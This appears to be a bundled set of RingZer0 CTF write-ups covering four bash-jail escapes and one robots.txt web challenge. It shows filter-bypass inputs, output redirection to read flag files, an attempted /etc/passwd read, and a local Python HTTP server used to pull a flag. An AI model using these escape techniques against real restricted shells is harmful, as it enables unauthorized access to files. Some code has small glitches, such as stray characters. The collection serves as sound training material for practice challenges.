<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-andrewaeva
description: CTF writeups and security challenges by andrewaeva.
---

# Writeups by andrewaeva

Source repository: `/repos/andrewaeva`

## Repository Index

- RingZer0-CTF-Writeups/README.md
- RingZer0-CTF-Writeups/Jail Escaping/bash jail 1.md
- RingZer0-CTF-Writeups/Jail Escaping/bash jail 2.md
- RingZer0-CTF-Writeups/Jail Escaping/bash jail 3.md
- RingZer0-CTF-Writeups/Jail Escaping/bash jail 4.md
- RingZer0-CTF-Writeups/Web/Big Brother is watching.md

## Writeup Content


### File: RingZer0-CTF-Writeups/README.md

# RingZer0-CTF-Writeups

If you like it, star it!



### File: RingZer0-CTF-Writeups/Jail Escaping/bash jail 1.md

# Bash Jail 1

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

```bash
Challenge bash code:
-----------------------------

while :
do
    echo "Your input:"
    read input
    output=`$input`
done

-----------------------------
Your input:
```


Okey let's try `/etc/passwd`

`/home/level1/prompt.sh: line 24: /etc/passwd: Permission denied`

Or try `/bin/bash`

```bash
/bin/bash
level1@lxc17-bash-jail:~$ who
who     whoami
level1@lxc17-bash-jail:~$ who
who     whoami
level1@lxc17-bash-jail:~$ whoami
level1@lxc17-bash-jail:~$ cat /home/level1/flag.txt
level1@lxc17-bash-jail:~$ ls
```

But we can't read stdout, let's redirect stdout to stderr

```bash
level1@lxc17-bash-jail:~$ cat /home/level1/flag.txt 1>&2
FLAG-*******
```



### File: RingZer0-CTF-Writeups/Jail Escaping/bash jail 2.md

# Bash Jail 2


BASH Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

```bash
Challenge bash code:
-----------------------------

function check_space {
    if [[ $1 == *[bdks';''&'' ']* ]]
    then
            return 0
    fi

    return 1
}

while :
do
    echo "Your input:"
    read input
    if check_space "$input"
    then
        echo -e '\033[0;31mRestricted characters has been used\033[0m'
    else
        output="echo Your command is: $input"
        eval $output
    fi
done

-----------------------------

```

```bash
Your input:
lol
Your command is: lol
Your input:
lol  2
Restricted characters has been used
Your input:
</home/level2/flag.txt
Your command is:
Your input:
`ls
Restricted characters has been used
`whoami`
Your command is: level2
Your input:
`</home/level2/flag.txt`
Your command is: FLAG-*****
```



### File: RingZer0-CTF-Writeups/Jail Escaping/bash jail 3.md

#BASH Jail Level 3:

```bash
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
    if [[ $1 == *[bdksc]* ]]
    then
            return 0
    fi

    return 1
}

while :
do
    echo "Your input:"
    read input
    if check_space "$input"
    then
        echo -e '\033[0;31mRestricted characters has been used\033[0m'
    else
        output=`$input` &>/dev/null
        echo "Command executed"
    fi
done

-----------------------------
```

```
Your input:
S
Command executed
Your input:
python -m SimpleHTTPServer
```

And from level 1

```bash
level1@lxc17-bash-jail:/usr/bin$ python3 1>&0
Python 2.7.6 (default, Jun 22 2015, 17:58:13)
[GCC 4.8.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.request
>>> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-****\n'
>>> Connection to ringzer0team.com closed.
```



### File: RingZer0-CTF-Writeups/Jail Escaping/bash jail 4.md

#BASH Jail Level 4:

```bash
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
    if [[ $1 == *[bdksc'/''<''>''&''$']* ]]
    then
            return 0
    fi

    return 1
}ßß

while :
do
    echo "Your input:"
    read input
    if check_space "$input"
    then
        echo -e '\033[0;31mRestricted characters has been used\033[0m'
    else
        output=`$input < /dev/null` &>/dev/null
        echo "Command executed"
    fi
done

-----------------------------
```

Such as level 3, we can use python SimpleHTTPServer :)

```
Your input:
python -m SimpleHTTPServer
```


```bash
level1@lxc17-bash-jail:~$ python3 1>&0
Python 3.4.3 (default, Oct 14 2015, 20:28:29)
[GCC 4.8.4] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
KeyboardInterrupt
>>> import urllib.request
>>> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-*****\n'
```



### File: RingZer0-CTF-Writeups/Web/Big Brother is watching.md

#Big Brother is watching

https://ringzer0team.com/robots.txt

```
User-agent: *
Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/
```

https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/

```
FLAG-***
```

